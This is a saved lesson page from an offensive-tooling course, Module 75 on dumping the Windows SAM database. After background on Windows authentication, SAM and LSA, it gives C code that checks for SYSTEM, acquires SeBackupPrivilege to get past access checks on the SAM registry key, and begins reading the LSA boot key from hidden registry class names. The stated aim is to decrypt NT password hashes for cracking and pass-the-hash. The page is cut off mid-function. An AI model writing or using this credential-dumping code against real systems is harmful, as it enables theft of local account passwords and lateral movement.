                <a data-target="_self" href="./75.html">
                    <div for="module-75" class="ml-2 text-sm font-medium 
                                bg-blue-700 font-bold rounded-sm">
                        Module 75 - Dumping The SAM Database
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-76" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./76.html">
                    <div for="module-76" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 76 - Dumping The SAM Remotely
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-77" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./77.html">
                    <div for="module-77" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 77 - Dumping The SAM From Disk
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-78" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./78.html">
                    <div for="module-78" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 78 - Domain Enumeration Using MS-SAMR
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-79" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./79.html">
                    <div for="module-79" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 79 - Dumping Browser Cookies: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-80" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./80.html">
                    <div for="module-80" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 80 - Dumping Saved Logins: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-81" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./81.html">
                    <div for="module-81" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 81 - Dumping Browser Cookies: Chrome
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-82" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./82.html">
                    <div for="module-82" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 82 - Dumping Saved Logins: Chrome
                    </div>
                </a>
            </div>
                </div>
    </div>
</div>          </div>
      </div>

      
      <div class="flex">
  <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-r border-l border-gray-600/60 pl-4 pt-2 pb-2 rounded-bl-xl rounded-br-xl shadow-inner">

          <div class="mr-2">
        <a data-target="_self" href="./74.html">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Previous</button>
        </a>
      </div>
    
    <div class="mr-2">
      <a data-target="_self" href="../All Modules.html">
        <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Modules</button>
      </a>
    </div>

    <div class="my-2 mr-2">
      <form id="complete-module" action="./75/complete" method="POST">
      </form>
      <form id="uncomplete-module" action="./7#" method="POST">
      </form>
    </div>

          <div class="mr-2">
        <a data-target="_self" href="./76.html">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Next</button>
        </a>
      </div>
    
  </div>
</div>

      
      <input type="hidden" id="objectives-completed" value="20973">

      
      <div id="copyWarning" class="fixed inset-0 hidden z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm">
  <div class="relative bg-gray-800 border border-gray-600 rounded-2xl shadow-2xl p-8 max-w-lg w-11/12 text-center transform transition-all scale-100">
    <p class="text-2xl font-bold text-white mb-4 tracking-wide">
      Reminder
    </p>
    <p class="text-gray-300 text-base mb-6 leading-relaxed">
      To remain compliant with the Terms of Service, avoid copying the entire module and instead copy the necessary sections.
    </p>
    <button onclick="hideCopyWarning()" class="w-full text-white font-medium rounded-lg text-sm px-5 py-2.5 text-center transition-all duration-200 bg-blue-600/80 hover:bg-blue-500/80 border border-blue-400/40 backdrop-blur-sm backdrop-saturate-150">
      I understand
    </button>
    <span class="absolute top-3 right-3 text-gray-400 hover:text-gray-200 cursor-pointer text-xl" onclick="hideCopyWarning()"></span>
  </div>
</div>



      
        </div>

  <footer id="footer" class="text-gray-400
    bg-gradient-to-t from-[#101926] via-[#172130] to-[#1e293b] backdrop-blur-md backdrop-saturate-150 z-20 border-t border-gray-700/50 border-gray-800
     hidden body-font">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4"> 2025 Maldev Academy Inc.</p>
        <a href="https://x.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 1200 1227" xmlns="http://www.w3.org/2000/svg">
            <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="white"></path>
          </svg>            
        </a>
        <a href="https://github.com/Maldev-Academy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-6 h-6" fill="white" viewBox="0 0 24 24" aria-hidden="true"><path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos">
          Terms of Service
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos">
  </a></footer></template>

<div id="app-root">
  
  <div class="fixed bottom-4 right-5 bg-gray-900 text-white text-sm font-bold rounded-xl px-2 py-2 shadow-lg cursor-pointer z-20" onclick="window.scrollTo({ top: 0, behavior: 'smooth' });">
      <img src="75_files/module-up.svg" width="20px" alt="">
  </div>

  <div class="bg-[#101926] p-4">
      
      <div class="flex relative z-10">
    <input type="hidden" value="20973">
    <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-l border-t border-gray-600/60 pl-4 pt-2 pb-2 rounded-tl-xl">
        <div>
            Module 75 - Dumping The SAM Database
        </div>
        <div class="ml-2 w-4 h-4 rounded-full shadow-inner bg-rose-500/90 ring-1 ring-rose-400/50"></div>

    </div>
    <div class="flex justify-end items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 pr-4 pt-2 pb-2 rounded-tr-xl border-t border-r border-gray-600/60">
        <div class="progress-container pr-4">
        <img src="75_file#.svg" onclick="toggleProgress()" id="progressToggle" width="20" alt="Progress Toggle" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="enlarge-container pr-4">
        <img src="75_files/enlarge.svg" onclick="toggleScreenWidth()" id="enlargeToggle" width="20" alt="Screen Width" class="hover:bg-gray-600 rounded-sm cursor-pointer">
        </div>

        <div class="objectives-container pr-4">
        <img src="75_files/objectives.svg" onclick="toggleObjectives()" id="objectivesToggle" width="20" alt="Objectives" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="toc-container pr-4">
        <img src="75_files/toc.svg" onclick="toggleToC()" id="tocToggle" width="20" alt="ToC" class="hover:bg-gray-600 rounded-sm cursor-pointer bg-gray-600">
        </div>

        <div class="terminal-container  pr-4 ">
        <img src="75_files/ide.svg" onclick="toggleIde()" id="terminalToggle" width="22" alt="Terminal" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/new/download/file/SamDump" target="_blank">
                    <img src="75_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" width="20" alt="Download">
                </a>
                </div>
            
                            </div>
</div>
      <div id="height-container" class="flex h-full min-h-[800px]">
          <div class="flex max-w-full min-w-full">
              <div class="flex-1 min-w-0">
                  
                  <div id="description-container" class="viewer code-description h-full w-full bg-gray-800/70 backdrop-blur-md backdrop-saturate-150 p-4 px-5 md:px-10 lg:px-20 border border-t-0 border-gray-600/60 shadow-inner"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">

    
    


    
    

    
    <div id="module-content" class="transition-opacity duration-300 opacity-100">
        <h2 id="toc-heading-0">Dumping the SAM Database</h2>
<h3 id="toc-heading-1">Introduction to Authentication</h3>
<p>Before being allowed to interact with a Windows system, a user must 
prove their identity by authenticating. Authentication is the process of
 verifying the identity of a person or object. To accommodate different 
authentication scenarios, Windows supports multiple types of 
authentication, which vary in length and complexity.</p>
<h3 id="toc-heading-2">Interactive Authentication</h3>
<p>Interactive authentication is used to grant access to both local and 
domain resources. It begins when a user supplies a set of credentials 
(e.g. password, smart card, certificate) and, if successful, ends with 
the creation of an <em>access token</em>.</p>
<p>An access token serves as the security context of a process or thread
 and contains information such as the identity and privileges of the 
user. When interacting with a <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/securable-objects" target="_blank">securable object</a>,
 the system uses the token during to determine whether the user has 
sufficient rights to perform the requested action. An object is 
considered securable if it has a <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptors" target="_blank">security descriptor</a>,
 which is a data structure containing security information about the 
object. This information includes a discretionary access control list 
(DACL), which defines who has access to the object and their access 
level.</p>
<p>For the purpose of authentication, Windows uses a <em>domain</em>. A 
domain associates a set of users and groups with a policy, which governs
 the actions they can perform and the resources they can access. It also
 provides management infrastructure for these entities, including logon 
infrastructure. Domain architecture is complex enough to warrant an 
entire course, so we will start by familiarizing ourselves with the 
authentication process of the simplest form of a domain: the local 
domain.</p>
<h3 id="toc-heading-3">The Local Domain</h3>
<p>Although domains are often associated with enterprise networks, every
 computer, whether stand-alone or part of a network, belongs to a domain
 known as the <em>local domain</em>. This domain usually goes unnoticed because it shares the same name as the computer itself.</p>
<img src="75_files/LocalDomain.png" style="margin:auto" width="600px">
<p>In this scenario, the <em>local security policy</em> is applied to local users and groups. Maintained by the Local Security Authority (LSA), it includes information such as:</p>
<ul>
<li>
<p>Account rights - The privileges assigned to a user's token when they log in.</p>
</li>
<li>
<p>Logon rights - What types of authentication a user or group is 
allowed to perform. For example, they can be used to deny a user from 
authenticating over the network.</p>
</li>
<li>
<p>Security auditing policy - Governs which events will be recorded in 
the event log and the conditions under which they will be recorded, such
 as success or failure.</p>
</li>
</ul>
<p>The LSA is also responsible for local domain management. To this end,
 it maintains two databases stored as registry keys: the SAM database 
and the LSA policy database:</p>
<ul>
<li>
<p>The Security Account Manager (SAM) database contains login 
information about local groups and users, such as usernames, password 
hashes, security identifiers (SIDs), and group memberships. When 
authenticating to the local domain, the LSA calculates a hash of your 
password and matches it with the one stored in the SAM.</p>
</li>
<li>
<p>On the other hand, the LSA policy database contains the local 
security policy described above. We will deep dive into the LSA policy 
in a later module.</p>
</li>
</ul>
<h3 id="toc-heading-4">Network Authentication</h3>
<p>In certain scenarios, an application or service may need to access 
network resources, such as a file share. This type of authentication 
uses previously established credentials and is typically transparent 
unless alternative credentials must be specified. Windows supports 
multiple network authentication protocols, which we will explore later.</p>
<h3 id="toc-heading-5">Dumping the SAM Database</h3>
<p>The SAM database is located in the <code>Registry\Machine\SAM</code> and can only be accessed by <code>NT AUTHORITY\SYSTEM</code>. Alternatively, we can bypass access checks via the <code>SeBackupPrivilege</code> privilege. The <code>CanAccessSam</code> function determines if we can access the SAM by first querying the <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers" target="_blank">Security Identifier (SID)</a> of the user associated with our process. Then, it constructs the SID of the <code>NT AUTHORITY\SYSTEM</code> account and compares the two. If they are equal, we can simply proceed. Otherwise, we attempt to acquire the <code>SeBackupPrivilege</code> privilege. If we fail, we cannot access the SAM.</p>
<p>First, we will create a helper function that will be used by the <code>CanAccessSam</code> function that checks if the provided SID is that of <code>NT AUTHORITY\SYSTEM</code>. The <code>IsSidLocalSystem</code> function has one parameter <code>Sid</code> which is the user's ID. It then uses <code>RtlAllocateAndInitializeSid</code> to construct <code>NT AUTHORITY\SYSTEM</code>'s SID, being <code>S-1-5-18</code>. Finally, a comparison is made using <code>RtlEqualSid</code> which, if true, means that the given SID matches <code>NT AUTHORITY\SYSTEM</code>.</p>
<p>The <code>IsSidLocalSystem</code> function has one parameter, <code>Sid</code>, which is a pointer to the SID that is to be compared to <code>S-1-5-18</code>.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOLEAN <span class="token function">IsSidLocalSystem</span><span class="token punctuation">(</span>_In_ PSID Sid<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment">//</span>
    <span class="token comment">// We need the NT Identifier Authority, represented by the "5" in "S-1-5-18", and the Local System RID, which matches "18"</span>
    <span class="token comment">//</span>

	PSID                     LocalSystemSid<span class="token punctuation">;</span>
	SID_IDENTIFIER_AUTHORITY IdentifierAuthority <span class="token operator">=</span> SECURITY_NT_AUTHORITY<span class="token punctuation">;</span>
	NTSTATUS                 Status <span class="token operator">=</span> <span class="token function">RtlAllocateAndInitializeSid</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>IdentifierAuthority<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> SECURITY_LOCAL_SYSTEM_RID<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>LocalSystemSid<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not initialize the NT AUTHORITY\\SYSTEM SID: 0x%08lX"</span><span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	BOOLEAN Result <span class="token operator">=</span> <span class="token function">RtlEqualSid</span><span class="token punctuation">(</span>Sid<span class="token punctuation">,</span> LocalSystemSid<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">RtlFreeSid</span><span class="token punctuation">(</span>LocalSystemSid<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> Result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>The <code>CanAcccessSam</code> function has one parameter, <code>NtOpenKeyExPointer</code>, which is a function pointer to <code>NtOpenKeyEx</code>. This informs us under what circumstances we are accessing the SAM. If the parameter is not set, we are <code>NT AUTHORITY\SYSTEM</code> and can simply use <code>NtOpenKey</code> to access SAM keys. In the other case, we must use <code>NtOpenKeyEx</code> with the <code>REG_OPTION_BACKUP_RESTORE</code> flag. Since <code>NtOpenKeyEx</code> is only available on Windows 7 and above, we will dynamically resolve it and fail if it is not present.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">NTSTATUS <span class="token function">CanAccessSam</span><span class="token punctuation">(</span>_Out_ <span class="token function">decltype</span><span class="token punctuation">(</span>NtOpenKeyEx<span class="token punctuation">)</span><span class="token operator">*</span><span class="token operator">*</span> NtOpenKeyExPointer<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token comment">//</span>
	<span class="token comment">// Open a handle to the process token. </span>
	<span class="token comment">// You can use the NtCurrentProcessToken pseudo-handle on Windows 8 and above.</span>
	<span class="token comment">//</span>

	HANDLE   TokenHandle<span class="token punctuation">;</span>
	NTSTATUS Status <span class="token operator">=</span> <span class="token function">NtOpenProcessToken</span><span class="token punctuation">(</span>NtCurrentProcess<span class="token punctuation">,</span> TOKEN_QUERY<span class="token punctuation">,</span> <span class="token operator">&amp;</span>TokenHandle<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not open process token: 0x%08lX"</span><span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> Status<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//</span>
	<span class="token comment">// Query the token user's SID</span>
	<span class="token comment">//</span>

	ULONG       ReturnLength<span class="token punctuation">;</span>
	UCHAR       Buffer<span class="token punctuation">[</span>TOKEN_USER_MAX_SIZE<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	PTOKEN_USER UserSid <span class="token operator">=</span> <span class="token punctuation">(</span>PTOKEN_USER<span class="token punctuation">)</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>

	Status <span class="token operator">=</span> <span class="token function">NtQueryInformationToken</span><span class="token punctuation">(</span>TokenHandle<span class="token punctuation">,</span> TokenUser<span class="token punctuation">,</span> UserSid<span class="token punctuation">,</span> TOKEN_USER_MAX_SIZE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ReturnLength<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">NtClose</span><span class="token punctuation">(</span>TokenHandle<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not retrieve the user SID of the process token: 0x%08lX"</span><span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> Status<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//</span>
	<span class="token comment">// If we are not running in the context of local system account, </span>
	<span class="token comment">// our only other hope of accessing the SAM is leveraging NtOpenKeyEx alongside SeBackupPrivilege</span>
	<span class="token comment">//</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">IsSidLocalSystem</span><span class="token punctuation">(</span>UserSid<span class="token punctuation">)</span> <span class="token operator">==</span> TRUE<span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">return</span> Status<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	ULONG Privilege <span class="token operator">=</span> SE_BACKUP_PRIVILEGE<span class="token punctuation">;</span>
	PVOID State<span class="token punctuation">;</span>

	Status <span class="token operator">=</span> <span class="token function">RtlAcquirePrivilege</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Privilege<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>State<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not acquire the SeBackupPrivilege privilege: 0x%08lX"</span><span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> Status<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//</span>
	<span class="token comment">// NtOpenKeyEx only exists on Windows 7 and above.</span>
	<span class="token comment">// On earlier versions of Windows, you can use NtSaveKey in conjuction with the SeBackupPrivilege privilege to dump the necessary keys to a file</span>
	<span class="token comment">//</span>

	PVOID          DllHandle<span class="token punctuation">;</span>
	UNICODE_STRING DllName <span class="token operator">=</span> <span class="token function">RTL_CONSTANT_STRING</span><span class="token punctuation">(</span>L<span class="token string">"ntdll.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	Status <span class="token operator">=</span> <span class="token function">LdrGetDllHandle</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>DllName<span class="token punctuation">,</span> <span class="token operator">&amp;</span>DllHandle<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not get a handle to NTDLL: 0x%08lX"</span><span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> Status<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	ANSI_STRING ProcedureName <span class="token operator">=</span> <span class="token function">RTL_CONSTANT_ANSI_STRING</span><span class="token punctuation">(</span><span class="token string">"NtOpenKeyEx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	Status <span class="token operator">=</span> <span class="token function">LdrGetProcedureAddress</span><span class="token punctuation">(</span>DllHandle<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ProcedureName<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>PVOID<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>NtOpenKeyExPointer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not find NtOpenKeyEx: 0x%08lX"</span><span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">return</span> Status<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h3 id="toc-heading-6">Dumping local domain information</h3>
<p>Windows stores the MD4 hash of each local user's password. This hash is commonly known as the <em>NT hash</em>.
 For compatibility reasons, Windows used to store an additional LAN 
Manager (LM) hash. This feature has been disabled by default since 
Windows Vista.</p>
<p>Unfortunately, dumping NT hashes is not trivial as they are subject 
to multiple layers of obfuscation: First, the NT hash is encrypted with 
the DES algorithm where the key is the relative identifier (RID) of the 
corresponding user. The RID is a unique number assigned to each <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-principals" target="_blank">security principle</a>
 (such as a user or group) within a domain; in this scenario, the local 
domain. Next, the DES-encrypted hash is encrypted using the password 
encryption key (PEK). The PEK, in turn, is encrypted using the <em>LSA system key</em>.</p>
<img src="75_files/HashObfuscation.png" style="margin:auto" width="800px">
<p>Access to these hashes is useful because the weak hashing algorithm makes them easily crackable. Nonetheless, you can use <em>pass-the-hash</em> to perform network authentication without knowing the plaintext password. This technique will be explored in a later module.</p>
<p>As mentioned earlier, the first step in retrieving NT hashes is 
acquiring the LSA system key. This 16-byte key is divided among the <code>ClassName</code>
 attribute of four registry keys, with each key containing four bytes of
 the LSA system key. All of these keys are subkeys of the LSA 
configuration key, which is in <code>\Registry\Machine\SYSTEM\CurrentControlSet\Control\Lsa\</code>. The specific subkeys are:</p>
<ul>
<li>
<p><code>\Registry\Machine\SYSTEM\CurrentControlSet\Control\Lsa\JD</code></p>
</li>
<li>
<p><code>\Registry\Machine\SYSTEM\CurrentControlSet\Control\Lsa\Skew1</code></p>
</li>
<li>
<p><code>\Registry\Machine\SYSTEM\CurrentControlSet\Control\Lsa\GBG</code></p>
</li>
<li>
<p><code>\Registry\Machine\SYSTEM\CurrentControlSet\Control\Lsa\Data</code></p>
</li>
</ul>
<p>In addition, a series of permutations must be performed on the key's 
bytes to achieve its true value. Note that the LSA system key differs 
from system to system.
This process is encapsulated in the <code>GetLsaSystemKey</code> function, which opens a handle to each one of the keys described above, queries their class name before using <code>wcstoul</code> to convert it into a 4 byte integer. If it succeeds in constructing the 16-byte key, it will set each byte of <code>SystemKey</code> buffer according to the permutations, giving us the LSA system key.</p>
<p>The <code>GetLsaSystemKey</code> function has one parameter, <code>SystemKey</code>, which is a pointer to a 16-byte buffer that will receive the LSA system key.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">NTSTATUS <span class="token function">GetLsaSystemKey</span><span class="token punctuation">(</span>_Out_ PUCHAR SystemKey<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token comment">//</span>
	<span class="token comment">// Open a handle to the LSA configuration key</span>
	<span class="token comment">//</span>

	HANDLE			  LsaKey<span class="token punctuation">;</span>
	UNICODE_STRING    KeyName <span class="token operator">=</span> <span class="token function">RTL_CONSTANT_STRING</span><span class="token punctuation">(</span>L<span class="token string">"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	OBJECT_ATTRIBUTES KeyAttributes<span class="token punctuation">;</span>

	<span class="token function">InitializeObjectAttributes</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>KeyAttributes<span class="token punctuation">,</span> <span class="token operator">&amp;</span>KeyName<span class="token punctuation">,</span> OBJ_CASE_INSENSITIVE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

	NTSTATUS Status <span class="token operator">=</span> <span class="token function">NtOpenKey</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>LsaKey<span class="token punctuation">,</span> KEY_ENUMERATE_SUB_KEYS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>KeyAttributes<span class="token punctuation">)</span><span class="token punctuation">;</span>

